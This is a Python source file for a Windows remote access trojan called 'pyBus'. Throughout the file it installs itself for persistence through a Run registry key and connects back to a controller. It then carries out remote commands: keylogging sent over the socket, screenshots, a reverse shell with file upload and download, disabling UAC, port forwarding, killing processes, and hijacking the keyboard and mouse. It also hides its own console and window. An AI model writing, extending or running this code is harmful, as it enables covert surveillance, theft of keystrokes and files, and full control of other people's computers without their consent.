import socket
import sys
import time
import os
import signal
from tkinter import *
from PIL import ImageTk, Image
import threading
import pyautogui
import winreg
import shutil
import ctypes
import subprocess
import platform
import io
import winsound
import win32security
import win32api
import ntsecuritycon
import win32com.client
import win32gui
import win32console
import win32process
import win32com.client
import pickle
import pythoncom
import pyHook
import wmi
import webbrowser
from tendo import singleton

#Open only one instance
abc = singleton.SingleInstance()

def install():
    
    #Install pyBus in TEMP folder
    server = os.environ['TEMP']+os.sep+'server.exe'
    server_config =  os.environ['TEMP']+os.sep+'server.ini'
    try:       
        if not os.path.exists(server_config):
            shutil.copy('server.ini', server_config)

        if not os.path.exists(server):
            shutil.copy(sys.executable, server)

        # Install pyBus on Registry
        serverKey = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                   'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
                                   0, winreg.KEY_ALL_ACCESS)

        winreg.SetValueEx(serverKey, 'pyBus', 0, winreg.REG_SZ, server)
        winreg.CloseKey(serverKey)

        
    except:
        ctypes.windll.user32.MessageBoxW(0, 'File "server.ini" not found', 'Error', 0x0 | 0x10)
        os.kill(os.getpid(), signal.SIGTERM)
    
def client():
    pythoncom.CoInitialize()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Open server configuration file
    try:
        with open(os.environ['TEMP']+os.sep+'server.ini') as server_config:
            var = server_config.read().replace('\n', ' ').replace('\t', ' ').replace(' ', '')
            IP = var[var.find('=')+1: var.find('PORT=')]
            server = int(var[var.find('PORT=')+5:])
    except:
        ctypes.windll.user32.MessageBoxW(0, 'File "server.ini" not found', 'Error', 0x0 | 0x10)
        os.kill(os.getpid(), signal.SIGTERM)

    while True:    
        try:
            sock.connect((IP, server))
        except:
            time.sleep(3)
            continue

        while True:
            try:
                data = sock.recv(1024)
            except:
                break


            if data == b'remove':
                #Remove pyBus from registry
                serverKey = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_ALL_ACCESS)
                try:
                    winreg.DeleteValue(serverKey, 'pyBus')
                except:
                    pass
                finally:
                    winreg.CloseKey(serverKey)
                break

            elif data == b'openCD':
                ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door open', None, 0, None)

            elif data == b'closeCD':
                ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door closed', None, 0, None)

            elif data == b'showimage':
                image = sock.recv(1024).decode()

                try:
                    img = ImageTk.PhotoImage(Image.open(image))
                    top = Toplevel()
                    top.transient(root)
                    top.overrideredirect(1)
                    screen_width = top.winfo_screenwidth()
                    screen_height = top.winfo_screenheight()
                    x = (screen_width/2) - (img.width()/2)
                    y = (screen_height/2) - (img.height()/2)
                    top.geometry('%dx%d+%d+%d' % (img.width(), img.height(), x, y))
                    top.resizable('False', 'False')

                    Label(top, image=img).pack()
                    
                    '''
                    root = Tk()
                    root.overrideredirect(1)
                    img = ImageTk.PhotoImage(Image.open(os.path.normpath(image)))
                    screen_width = root.winfo_screenwidth()
                    screen_height = root.winfo_screenheight()
                    x = (screen_width/2) - (img.width()/2)
                    y = (screen_height/2) - (img.height()/2)
                    root.geometry('%dx%d+%d+%d' % (img.width(), img.height(), x, y))
                    root.resizable('False', 'False')                   
                    Label(root, image=img).pack()
                    root.update_idletasks()
                    root.update()
                    '''
                except:
                    pass

            elif data == b'removeimage':
                try:
                    top.destroy()
                except:
                    pass

            elif data == b'portfw':
                # Simple socket port Forwarding
                # Based on https://github.com/vinodpandey/python-port-forward
                # For pyBus i don't know how to make reverse port forwarding
                # If somebody know how to, contact me and help project
                # =)
                data = sock.recv(1024).decode()
                LISTEN = int(data[7: data.index('HOST:')])
                HOST = data[data.index('HOST:')+5: data.index('PORT:')]
                PORT = int(data[data.index('PORT:')+5:])

                def forward(source, destination):
                    try:
                        string = ' '
                        while string:
                            string = source.recv(1024)
                            
                            if string:
                                destination.sendall(string)
                            else:
                                source.shutdown(socket.SHUT_RD)
                                destination.shutdown(socket.SHUT_WR)
                    except:
                        pass
                # Dont use port 999, because pyBus use this port
                dock_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                dock_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                dock_socket.bind(('', LISTEN))
                dock_socket.listen(1)

                def server():
                    while True:
                        try:
                            client_socket = dock_socket.accept()[0]
                            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            server_socket.connect((HOST, PORT))
                            threading.Thread(target=forward, args=(client_socket, server_socket)).start()
                            threading.Thread(target=forward, args=(server_socket, client_socket)).start()
                        except:
                            pass
                        finally:
                            threading.Thread(target=server).start()
                            
                threading.Thread(target=server).start()

            elif data == b'startprogram':
                program = sock.recv(1024).decode()

                try:
                    os.startfile(program)
                except:
                    pass

            elif data == b'msg_manager':
                msg_manager = sock.recv(100).decode()

                #Based on
                #https://msdn.microsoft.com/en-us/library/windows/desktop/ms645505%28v=vs.85%29.aspx

                key = {'MB_ICONINFORMATION' :(0x40, 'Information'),
                        'MB_ICONQUESTION' : (0x20, 'Question'),
                        'MB_ICONWARNING' : (0x30, 'Warning'),
                        'MB_ICONWARNING' : (0x30, 'Warning'),
                        'MB_ICONSTOP' : (0x10, 'Stop'),
                        'MB_OK' : 0x0,
                        'MB_OKCANCEL' : 0x1,
                        'MB_RETRYCANCEL' : 0x5, 
                        'MB_YESNO' : 0x4,
                        'MB_YESNOCANCEL' : 0x3
                        }
                def mesg():
                    Type = msg_manager[: msg_manager.index('MB', 3)]
                    Button = msg_manager[msg_manager.index('MB_', 3) : msg_manager.index('Text:')]
                    Text = msg_manager[msg_manager.index('Text:')+5: msg_manager.index('End:')]
                    ctypes.windll.user32.MessageBoxW(0, Text, key[Type][1], key[Type][0] | key[Button])
                threading.Thread(target=mesg).start()

            elif data == b'screendump':
                screenshot = io.BytesIO()
                img = pyautogui.screenshot()
                img.save(screenshot, format='JPEG')
                screenshot_len = str(len(screenshot.getvalue())) + ' '
                for x in range(1024):
                    if len(screenshot_len) < 1024:
                        screenshot_len += '0'
                #with open('teste.jpg', 'wb') as arquivo:
                #    arquivo.write(screenshot.getvalue())
                sock.send(screenshot_len.encode())
                sock.sendall(screenshot.getvalue())

            elif data == b'getinfo':
                serverKey = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 0)
                RESTART= 'Yes'
                try:
                    winreg.QueryValueEx(serverKey, 'pyBus')
                except:
                    RESTART= 'No'
                finally:
                    winreg.CloseKey(serverKey)
                    
                PATH = sys.executable
                LOGIN_ID = os.environ['USERNAME']
                #ARCHITECTURE = sys.platform
                ARCHITECTURE = platform.machine()
                PLATFORM = platform.platform()
                packet = 'PATH:%sRESTART:%sLOGIN_ID:%sARCHITECTURE:%sPLATFORM:%s' %(
                    PATH, RESTART, LOGIN_ID, ARCHITECTURE, PLATFORM)
                sock.send(packet.encode())

            elif data == b'disableUAC':
                try:
                    UACKey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                    'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', 0, winreg.KEY_ALL_ACCESS)
                    winreg.SetValueEx(UACKey, 'EnableLUA', 0, winreg.REG_DWORD, 0)
                    winreg.CloseKey(UACKey)

                    #Force reboot
                    ctypes.windll.user32.ExitWindowsEx(6,0)
                except:
                    pass
                
            elif data == b'playsound':
                sound = sock.recv(1024).decode()
                winsound.PlaySound(sound, winsound.SND_FILENAME |
                                   winsound.SND_PURGE | winsound.SND_NODEFAULT | winsound.SND_ASYNC)

            # Shutdown functions are based on sites. Thanks guys for code =)
            # https://msdn.microsoft.com/en-us/library/windows/desktop/aa376868%28v=vs.85%29.aspx
            # https://msdn.microsoft.com/en-us/library/windows/desktop/aa375202%28v=vs.85%29.aspx
            # http://www.blog.pythonlibrary.org/2010/03/27/restarting-pcs-with-python/
            # https://groups.google.com/forum/#!topic/comp.lang.python/pgRGATdL5k8
            elif data == b'logoff':
                processToken = win32security.OpenProcessToken(win32api.GetCurrentProcess(),
                                                              ntsecuritycon.TOKEN_ADJUST_PRIVILEGES | ntsecuritycon.TOKEN_QUERY)
                processPrivilegeValue = win32security.LookupPrivilegeValue(None, ntsecuritycon.SE_SHUTDOWN_NAME)
                win32security.AdjustTokenPrivileges(processToken, 0, [(processPrivilegeValue, ntsecuritycon.SE_PRIVILEGE_ENABLED)])
                ctypes.windll.user32.ExitWindowsEx(4,0)

            elif data == b'poweroff':
                processToken = win32security.OpenProcessToken(win32api.GetCurrentProcess(),
                                                              ntsecuritycon.TOKEN_ADJUST_PRIVILEGES | ntsecuritycon.TOKEN_QUERY)
                processPrivilegeValue = win32security.LookupPrivilegeValue(None, ntsecuritycon.SE_SHUTDOWN_NAME)
                win32security.AdjustTokenPrivileges(processToken, 0, [(processPrivilegeValue, ntsecuritycon.SE_PRIVILEGE_ENABLED)])
                ctypes.windll.user32.ExitWindowsEx(12,0)

            elif data == b'reboot':
                processToken = win32security.OpenProcessToken(win32api.GetCurrentProcess(),
                                                              ntsecuritycon.TOKEN_ADJUST_PRIVILEGES | ntsecuritycon.TOKEN_QUERY)
                processPrivilegeValue = win32security.LookupPrivilegeValue(None, ntsecuritycon.SE_SHUTDOWN_NAME)
                win32security.AdjustTokenPrivileges(processToken, 0, [(processPrivilegeValue, ntsecuritycon.SE_PRIVILEGE_ENABLED)])
                ctypes.windll.user32.ExitWindowsEx(6,0)

            elif data == b'shutdown':
                processToken = win32security.OpenProcessToken(win32api.GetCurrentProcess(),
                                                              ntsecuritycon.TOKEN_ADJUST_PRIVILEGES | ntsecuritycon.TOKEN_QUERY)
                processPrivilegeValue = win32security.LookupPrivilegeValue(None, ntsecuritycon.SE_SHUTDOWN_NAME)
                win32security.AdjustTokenPrivileges(processToken, 0, [(processPrivilegeValue, ntsecuritycon.SE_PRIVILEGE_ENABLED)])
                ctypes.windll.user32.ExitWindowsEx(5,0)

            elif data == b'send_text':
                text = sock.recv(1024).decode()
                text = text.replace('|', '{ENTER}')
                shell = win32com.client.Dispatch('WScript.Shell')
                shell.AppActivate(win32gui.GetForegroundWindow())
                shell.SendKeys(text)

            elif data == b'active_wnds_refresh':
                # More info
                # https://msdn.microsoft.com/en-us/library/windows/desktop/ms633497%28v=vs.85%29.aspx
                # Function winEnumHandler is not my code.
                # Original source. Thanks 4 code =):
                # https://mail.python.org/pipermail/python-win32/2008-December/008510.html
                active_wnds = []
                def winEnumHandler(hwnd, lParam):
                    if win32gui.IsWindowVisible(hwnd):
                        active_wnds.append((win32process.GetWindowThreadProcessId(hwnd)[1], win32gui.GetWindowText(hwnd)))

                win32gui.EnumWindows(winEnumHandler, None)
                active_wnds = [wnds for wnds in active_wnds if wnds[1] !='']
                packet = pickle.dumps(active_wnds)
                sock.send(str(len(packet)).encode())
                sock.send(packet)

            elif data == b'active_wnds_kill':
                PID = sock.recv(1024).decode()
                try:
                    os.kill(int(PID), signal.SIGTERM)
                except:
                    pass

            elif data == b'active_wnds_focus':
                PID = sock.recv(1024).decode()
                shell = win32com.client.Dispatch('WScript.Shell')
                shell.AppActivate(PID)

            elif data == b'enableUAC':
                try:
                    UACKey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                    'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', 0, winreg.KEY_ALL_ACCESS)
                    winreg.SetValueEx(UACKey, 'EnableLUA', 0, winreg.REG_DWORD, 1)
                    winreg.CloseKey(UACKey)

                    #Force reboot
                    ctypes.windll.user32.ExitWindowsEx(6,0)
                except:
                    pass

            elif data == b'mousepos':
                pyautogui.FAILSAFE = False
                packet = sock.recv(100).decode()
                mouse_posX = packet[:packet.index('x')]
                mouse_posY = packet[packet.index('x')+1:packet.index('X')]
                                     
                pyautogui.moveTo(int(mouse_posX), int(mouse_posY))

            elif data == b'keylogger':
                start_stop = sock.recv(1024)
                def pumpMessages():
                    logger.KeyDown=keylogger
                    logger.HookKeyboard()
                    pythoncom.PumpMessages()
                    
                if start_stop == b'start':
                    win=win32console.GetConsoleWindow()
                    win32gui.ShowWindow(win,0)
                         
                    def keylogger(event):
                        key=chr(event.Ascii)
                        if event.Ascii==13:
                            key='[Enter]'
                        elif event.Ascii==8:
                            key='[Backspace]'
                        
                        sock.send(str(event.Ascii).encode())

                    threading.Thread(target=pumpMessages).start()

                elif start_stop == b'stop':
                    #Send '\x00' to pyBus before close socket.
                    sock.send(b'0000')
                    logger.UnhookKeyboard()

            elif data == b'active_process_refresh':
                active_process = []
                #pythoncom.CoInitialize()
                c = wmi.WMI()
                active_process = [(process.ProcessId, process.Name) for process in c.Win32_Process()]
                packet = pickle.dumps(active_process)
                sock.send(str(len(packet)).encode())
                sock.send(packet)

            elif data == b'active_process_kill':
                PID = sock.recv(1024).decode()
                try:
                    os.kill(int(PID), signal.SIGTERM)
                except:
                    pass

            elif data == b'change_wallpaper':
                wallpaper = sock.recv(1024).decode()
                wallpaperKey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Control panel\\Desktop',
                                   0, winreg.KEY_ALL_ACCESS)

                winreg.SetValueEx(wallpaperKey, 'Wallpaper', 0, winreg.REG_SZ, wallpaper)
                winreg.CloseKey(wallpaperKey)
                
            elif data == b'reverse_shell':
                command1 = sock.recv(1024).decode()
                command2 = command1.split()
                command = []
                for x in command2:
                    command.append(x.replace('?', ' '))

                if command[0] == 'upload':
                    #file = sock.recv(int(command[3]))
                    file = b''
                    while len(file) < int(command[3]):
                        data = sock.recv(1024)
                        file += data
                        print(len(file),'<',int(command[3]))
                        
                    FILE = command[1]#.replace('?', ' ')
                    DIRECTORY = command[2]
                    try:
                        with open('%s%s%s' %(DIRECTORY, os.sep, FILE), 'wb') as uploaded_file:
                            uploaded_file.write(file)
                    except:
                        pass

                elif command[0] == 'download':
                    FILE = command[1]
                    try:
                        with open(FILE, 'rb') as file1:
                            down_file = file1.read()
                    except:
                        down_file = b''

                    sock.send(str(len(down_file)).encode())
                    sock.sendall(down_file)
                    

                else:
                    try:
                        subprocess.Popen(command)
                        packet = pickle.dumps('Command %s executed' %command[0])
                        sock.send(b'258')
                        sock.send(packet)
                    except:
                        if command[0].startswith('cd'):
                            try:
                                directory = os.chdir(command[1])
                            except:
                                pass

                        else:
                            directory = os.chdir(os.getcwd())

                        shell = subprocess.Popen(command, shell=True,
                                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                                        cwd = directory)

                        packet = pickle.dumps(shell.stdout.read())
                        sock.send(str(len(packet)).encode())
                        sock.send(packet)

            elif data == b'control_mouse':
                position = sock.recv(10).decode()
                positionX = position[: position.index(';')]
                positionY = position[position.index(';')+1 : position.index('@')]
                pyautogui.moveTo(int(positionX), int(positionY))

            elif data == b'go_to_url':
                url = sock.recv(1024).decode()
                webbrowser.open_new_tab(url)

            elif data == b'disable_keys':
                keys = list(sock.recv(1024).decode())

                def pumpMessages():
                    StopKeys.KeyAll = stop_keys
                    StopKeys.HookKeyboard()
                    pythoncom.PumpMessages()
                    
                def stop_keys(event):
                    if chr(event.Ascii) in keys:
                        return False

                threading.Thread(target=pumpMessages).start()

            elif data == b'enable_keys':
                StopKeys.UnhookKeyboard()


            elif data == b'disable_all_keys':

                def pumpMessages():
                    StopAllKeys.KeyAll = stop_all_keys
                    StopAllKeys.HookKeyboard()
                    pythoncom.PumpMessages()
                    
                def stop_all_keys(event):
                    return False

                threading.Thread(target=pumpMessages).start()

            elif data == b'enable_all_keys':
                StopAllKeys.UnhookKeyboard()

            elif data == b'kill':
                break
                

        os.kill(os.getpid(), signal.SIGTERM)

# Start installation
install()

# For pyHook
logger = pyHook.HookManager()
StopKeys = pyHook.HookManager()
StopAllKeys = pyHook.HookManager()

#Start client
threading.Thread(target=client).start()

root = Tk()
root.geometry('0x0+0+0')
root.attributes('-alpha', 0)
root.overrideredirect(1)
root.mainloop()
